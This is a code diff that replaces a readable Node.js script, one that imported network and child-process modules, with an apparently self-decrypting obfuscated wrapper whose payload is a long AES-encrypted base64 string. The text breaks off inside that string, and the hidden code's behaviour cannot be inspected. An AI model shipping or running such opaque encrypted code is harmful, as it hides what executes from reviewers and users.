@@ -1,286 +1,31 @@
-"use strict";
+// ╔══════════════════════════════════════════════════════╗
+// ║  Obfuscationary by JusticeTech                      ║
+// ║  Version  : 4.0.5-h+e                                 ║
+// ║  Encrypted: 2026-10-18 18:43:22 UTC                   ║
+// ║  Cipher   : AES-256-GCM                               ║
+// ║  Tamper   : HMAC-SHA256 authenticated                 ║
+// ╚══════════════════════════════════════════════════════╝
 
-const fs = require("fs");
-const path = require("path");
-const https = require("https");
-const http = require("http");
-const crypto = require("crypto");
-const { spawn, spawnSync } = require("child_process");
+// Encrypted by Obfuscationary by JusticeTech v4.0.5-h+e
+(async()=>{
+  if(typeof require==='undefined')throw new Error('[Obfuscationary] Use Node.js.');
+  const _b64='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